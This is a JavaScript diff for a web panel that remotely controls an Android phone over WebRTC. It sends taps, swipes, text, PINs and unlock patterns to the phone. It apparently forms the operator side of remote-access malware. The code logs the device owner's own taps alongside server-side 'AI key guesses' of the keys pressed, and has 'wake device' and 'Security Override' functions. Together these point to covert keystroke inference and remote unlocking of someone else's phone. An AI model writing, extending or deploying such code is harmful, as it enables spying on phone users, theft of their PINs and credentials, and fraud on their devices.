@@ -19,10 +19,16 @@ socket.on('connect_error', (err) => debugUI(`CONN ERROR`, "#ff4444"));
 
 let peerConnection;
 let dataChannel;
+
 const remoteVideo = document.getElementById('remoteVideo');
 const remoteVideo2 = document.getElementById('remoteVideo2');
 const remoteContainer = document.getElementById('remote-container');
 const remoteContainer2 = document.getElementById('remote-container-2');
+const drawCanvas = document.getElementById('draw-overlay');
+const drawCanvas2 = document.getElementById('draw-overlay-2');
+const drawCtx = drawCanvas.getContext('2d');
+const drawCtx2 = drawCanvas2.getContext('2d');
+
 const dinoLoader = document.getElementById('dino-loader');
 const dinoLoader2 = document.getElementById('dino-loader-2');
 const statusDot = document.getElementById('status-dot');
@@ -32,26 +38,91 @@ const roomIdInput = document.getElementById('roomId');
 const pinSimulator = document.getElementById('pin-simulator');
 const patternSimulator = document.getElementById('pattern-simulator');
 const unlockInput = document.getElementById('unlock-pin');
-const confirmBtn = document.getElementById('send-unlock');
 
 let isPatternMode = false;
 let isPinMode = false;
 let patternPoints = [];
-
-// --- SMART MATCHING BUFFER ---
 const pendingAIGuesses = new Map();
+
+// --- INPUT TRACKING ---
+let isMouseDown = false;
+let startX, startY, startTime;
+
+function getCoords(e, element) {
+    const rect = element.getBoundingClientRect();
+    return {
+        x: (e.clientX - rect.left) / rect.width,
+        y: (e.clientY - rect.top) / rect.height,
+        canvasX: e.clientX - rect.left,
+        canvasY: e.clientY - rect.top
+    };
+}
 
 function showRemoteClickIndicator(x, y, label = 'Tap', container = remoteContainer) {
     if (!container) return;
     const indicator = document.createElement('div');
     indicator.className = 'remote-tap-indicator';
-    indicator.title = label;
     indicator.style.left = `${(x * 100).toFixed(1)}%`;
     indicator.style.top = `${(y * 100).toFixed(1)}%`;
     container.appendChild(indicator);
     setTimeout(() => indicator.remove(), 800);
 }
 
+function handleInteractionStart(e, element) {
+    if (element.style.display === 'none') return;
+    isMouseDown = true;
+    const coords = getCoords(e, element);
+    startX = coords.x; startY = coords.y; startTime = Date.now();
+
+    if (isPatternMode) {
+        patternPoints = [{ x: coords.x, y: coords.y }];
+        [drawCtx, drawCtx2].forEach(ctx => {
+            ctx.beginPath();
+            ctx.lineWidth = 4;
+            ctx.strokeStyle = "#00ff88";
+            ctx.moveTo(coords.canvasX, coords.canvasY);
+        });
+    }
+}
+
+function handleInteractionMove(e, element) {
+    if (!isMouseDown) return;
+    const coords = getCoords(e, element);
+    if (isPatternMode) {
+        patternPoints.push({ x: coords.x, y: coords.y });
+        [drawCtx, drawCtx2].forEach(ctx => {
+            ctx.lineTo(coords.canvasX, coords.canvasY);
+            ctx.stroke();
+        });
+    }
+}
+
+function handleInteractionEnd(e, element) {
+    if (!isMouseDown) return;
+    isMouseDown = false;
+    const coords = getCoords(e, element);
+    const duration = Date.now() - startTime;
+    const dist = Math.sqrt(Math.pow(coords.x - startX, 2) + Math.pow(coords.y - startY, 2));
+
+    if (dataChannel?.readyState === 'open') {
+        if (isPatternMode && patternPoints.length > 5) {
+            dataChannel.send(JSON.stringify({ type: 'unlock', points: patternPoints }));
+            setTimeout(togglePatternMode, 1000);
+        } else if (dist < 0.01) {
+            dataChannel.send(JSON.stringify({ type: 'click', x: startX, y: startY, clickId: Date.now() }));
+        } else {
+            dataChannel.send(JSON.stringify({ type: 'swipe', x1: startX, y1: startY, x2: coords.x, y2: coords.y, duration: Math.max(duration, 100) }));
+        }
+    }
+}
+
+[remoteVideo, remoteVideo2].forEach(el => {
+    el.addEventListener('mousedown', (e) => handleInteractionStart(e, el));
+    window.addEventListener('mousemove', (e) => handleInteractionMove(e, el));
+    window.addEventListener('mouseup', (e) => handleInteractionEnd(e, el));
+});
+
+// --- PEER CONNECTION ---
 async function createPeerConnection(roomId) {
     if (peerConnection) return;
     const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
@@ -66,11 +137,8 @@ async function createPeerConnection(roomId) {
                 if (data.type === 'device_click' || data.type === 'click_feedback') {
                     const rid = roomIdInput.value || localStorage.getItem('lastRoomId');
                     socket.emit("device_click", {
-                        roomId: rid,
-                        x: data.x,
-                        y: data.y,
-                        label: data.label || "Device Tap",
-                        clickId: data.clickId || Date.now()
+                        roomId: rid, x: data.x, y: data.y,
+                        label: data.label || "Device Tap", clickId: data.clickId || Date.now()
                     });
                 }
             } catch (e) {}
@@ -96,22 +164,14 @@ async function createPeerConnection(roomId) {
     };
 }
 
+// --- UI HELPERS ---
 let clickCount = 0;
 function displayCoordinates(x, y, source = "Tap", clickId = null, aiGuess = null) {
     const logContent = document.getElementById('click-log-content');
     if (!logContent) return;
-
     const normalizedClickId = clickId ? String(clickId) : null;
     const pendingAI = normalizedClickId ? pendingAIGuesses.get(normalizedClickId) : null;
     const effectiveAiGuess = aiGuess || pendingAI || '';
-
-    updateMockAndroidUI({
-        roomId: roomIdInput.value || 'unknown',
-        clickId: normalizedClickId,
-        label: source,
-        x, y,
-        aiGuess: effectiveAiGuess
-    });
 
     if (normalizedClickId) {
         const existing = logContent.querySelector(`.log-entry[data-click-id="${normalizedClickId}"]`);
@@ -125,14 +185,10 @@ function displayCoordinates(x, y, source = "Tap", clickId = null, aiGuess = null
 
     if (clickCount === 0) logContent.innerHTML = '';
     clickCount++;
-
     const label = effectiveAiGuess ? `${source} (AI: ${effectiveAiGuess})` : source;
     const entry = document.createElement('div');
     entry.className = 'log-entry';
-    if (normalizedClickId) {
-        entry.setAttribute('data-click-id', normalizedClickId);
-        entry.dataset.order = getOrdinal(clickCount);
-    }
+    if (normalizedClickId) { entry.setAttribute('data-click-id', normalizedClickId); entry.dataset.order = getOrdinal(clickCount); }
     entry.innerHTML = `<span><b>${getOrdinal(clickCount)}</b> ${label}:</span><span>${(x*100).toFixed(1)}%, ${(y*100).toFixed(1)}%</span>`;
     logContent.insertBefore(entry, logContent.firstChild);
 
@@ -141,7 +197,6 @@ function displayCoordinates(x, y, source = "Tap", clickId = null, aiGuess = null
 }
 
 socket.on("ai_key_guess_broadcast", (data) => {
-    logRawPayload('AI Guess', data);
     const normalizedClickId = data.clickId ? String(data.clickId) : null;
     const logContent = document.getElementById('click-log-content');
     const matchedEntry = normalizedClickId ? logContent.querySelector(`.log-entry[data-click-id="${normalizedClickId}"]`) : null;
@@ -155,25 +210,15 @@ socket.on("ai_key_guess_broadcast", (data) => {
         pendingAIGuesses.set(normalizedClickId, data.guessed_key);
         setTimeout(() => pendingAIGuesses.delete(normalizedClickId), 5000);
     }
-
-    const aiSuggestionText = document.getElementById('ai-suggestion-text');
-    if (aiSuggestionText) {
-        aiSuggestionText.innerText = data.guessed_key;
-        document.getElementById('ai-suggestion').style.display = 'block';
-    }
 });
 
 socket.on('device_click_broadcast', (data) => {
-    logRawPayload('Device Event', data);
     if (typeof data.x === 'number' && typeof data.y === 'number') {
         displayCoordinates(data.x, data.y, data.label || 'Device Tap', data.clickId);
     }
 });
 
-function getOrdinal(n) {
-    const s = ["th", "st", "nd", "rd"], v = n % 100;
-    return n + (s[(v - 20) % 10] || s[v] || s[0]);
-}
+function getOrdinal(n) { const s = ["th", "st", "nd", "rd"], v = n % 100; return n + (s[(v - 20) % 10] || s[v] || s[0]); }
 
 function startSharing() {
     const roomId = roomIdInput.value;
@@ -193,12 +238,9 @@ function refreshConnection() {
     const roomId = roomIdInput.value || localStorage.getItem('lastRoomId');
     if (!roomId) return;
     if (peerConnection) peerConnection.close();
-    peerConnection = null;
-    dataChannel = null;
-    remoteVideo.style.display = 'none';
-    remoteVideo2.style.display = 'none';
-    dinoLoader.style.display = 'flex';
-    dinoLoader2.style.display = 'flex';
+    peerConnection = null; dataChannel = null;
+    remoteVideo.style.display = 'none'; remoteVideo2.style.display = 'none';
+    dinoLoader.style.display = 'flex'; dinoLoader2.style.display = 'flex';
     socket.emit("join", roomId);
     createPeerConnection(roomId);
 }
@@ -214,10 +256,7 @@ function updateStatus(status, isActive) {
 
 function toggleMainPanel() {
     const panel = document.getElementById('main-actions-panel');
-    const btn = document.getElementById('panel-toggle');
     panel.classList.toggle('expanded');
-    btn.classList.toggle('active');
-    btn.querySelector('i').className = panel.classList.contains('expanded') ? 'fas fa-chevron-right' : 'fas fa-chevron-left';
 }
 
 function wakeDevice() {
@@ -230,15 +269,11 @@ function toggleUnlockInput() {
     if (isPinMode) {
         pinSimulator.style.display = 'flex';
         unlockInput.style.display = 'block';
-        confirmBtn.style.display = 'block';
         btn.classList.add('active-mode');
-        btn.innerHTML = '<i class="fas fa-times"></i> PIN';
     } else {
         pinSimulator.style.display = 'none';
         unlockInput.style.display = 'none';
-        confirmBtn.style.display = 'none';
         btn.classList.remove('active-mode');
-        btn.innerHTML = '<i class="fas fa-keyboard"></i> PIN';
     }
 }
 
@@ -257,29 +292,25 @@ function togglePatternMode() {
     if (isPatternMode) {
         patternSimulator.style.display = 'flex';
         btn.classList.add('active-mode');
-        btn.innerHTML = '<i class="fas fa-fingerprint"></i> DRAW';
-        drawCanvas.width = remoteVideo.clientWidth;
-        drawCanvas.height = remoteVideo.clientHeight;
-        drawCtx.clearRect(0, 0, drawCanvas.width, drawCanvas.height);
+        [drawCanvas, drawCanvas2].forEach((cv, i) => {
+            const vid = i === 0 ? remoteVideo : remoteVideo2;
+            cv.width = vid.clientWidth;
+            cv.height = vid.clientHeight;
+            const ctx = cv.getContext('2d');
+            ctx.clearRect(0, 0, cv.width, cv.height);
+        });
     } else {
         patternSimulator.style.display = 'none';
         btn.classList.remove('active-mode');
-        btn.innerHTML = '<i class="fas fa-braille"></i> Pattern';
     }
 }
 
 function toggleSecurityOverride() {
     const btn = document.getElementById('security-mode');
     const isAct = btn.classList.toggle('active-mode');
-    btn.innerHTML = isAct ? '<i class="fas fa-eye"></i> ON' : '<i class="fas fa-shield-alt"></i> Override';
-
     if (isAct) {
-        remoteVideo.style.display = 'block';
-        remoteVideo.style.background = '#111';
-        remoteVideo2.style.display = 'block';
-        remoteVideo2.style.background = '#111';
-        dinoLoader.style.display = 'none';
-        dinoLoader2.style.display = 'none';
+        [remoteVideo, remoteVideo2].forEach(v => { v.style.display = 'block'; v.style.background = '#111'; });
+        [dinoLoader, dinoLoader2].forEach(d => d.style.display = 'none');
     }
 }
 
@@ -291,64 +322,21 @@ function sendTypeText() {
     }
 }
 
-function updateMockAndroidUI(payload) {
-    document.getElementById('mock-ui-label').innerText = payload.label || 'Tap';
-    document.getElementById('mock-ui-meta').innerText = `AI: ${payload.aiGuess || '...'} • ${(payload.x*100).toFixed(1)}%`;
-    document.getElementById('mock-ui-json').innerText = JSON.stringify(payload, null, 2);
-    document.getElementById('mock-ui-window').style.display = 'flex';
-}
-
-function resetMockAndroidUI() {
-    document.getElementById('mock-ui-window').style.display = 'none';
-}
-
-function logRawPayload(label, payload) {
-    const box = document.getElementById('debug-payload-log');
-    if (!box) return;
-    if (box.innerHTML.includes('No data')) box.innerHTML = '';
-    const entry = document.createElement('div');
-    entry.style.fontSize = '0.65rem';
-    entry.style.borderBottom = '1px solid #333';
-    entry.innerHTML = `<span style="color:#00ff88">${label}:</span> ${JSON.stringify(payload)}`;
-    box.insertBefore(entry, box.firstChild);
-}
-
 function clearClickLog() {
     clickCount = 0;
-    document.getElementById('click-log-content').innerHTML = '<div style="color:#666; font-style:italic; text-align:center; padding:10px;">Waiting...</div>';
+    document.getElementById('click-log-content').innerHTML = '';
 }
 
-function handleInteraction(e, element) {
-    if (element.style.display === 'none') return;
-    const rect = element.getBoundingClientRect();
-    const x = (e.clientX - rect.left) / rect.width;
-    const y = (e.clientY - rect.top) / rect.height;
-    if (dataChannel?.readyState === 'open') dataChannel.send(JSON.stringify({ type: 'click', x, y, clickId: Date.now() }));
-}
-
-remoteVideo.addEventListener('mousedown', (e) => handleInteraction(e, remoteVideo));
-remoteVideo2.addEventListener('mousedown', (e) => handleInteraction(e, remoteVideo2));
-
-function makeMovable(element) {
-    const header = element.querySelector('.modal-header');
-    let isDragging = false;
-    let startX, startY, startLeft, startTop;
-
-    header.addEventListener('mousedown', (e) => {
-        isDragging = true;
-        startX = e.clientX; startY = e.clientY;
-        startLeft = parseInt(window.getComputedStyle(element).left);
-        startTop = parseInt(window.getComputedStyle(element).top);
-        element.style.zIndex = 3000;
-    });
-
-    window.addEventListener('mousemove', (e) => {
-        if (!isDragging) return;
-        element.style.left = (startLeft + e.clientX - startX) + 'px';
-        element.style.top = (startTop + e.clientY - startY) + 'px';
-    });
-
-    window.addEventListener('mouseup', () => isDragging = false);
-}
-makeMovable(pinSimulator);
-makeMovable(patternSimulator);
+socket.on("message", async (data) => {
+    if (data.offer) {
+        if (!peerConnection) await createPeerConnection(data.roomId);
+        await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
+        const answer = await peerConnection.createAnswer();
+        await peerConnection.setLocalDescription(answer);
+        socket.emit("message", { roomId: data.roomId, answer });
+    } else if (data.answer) {
+        if (peerConnection) await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
+    } else if (data.candidate && peerConnection) {
+        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+    }
+});
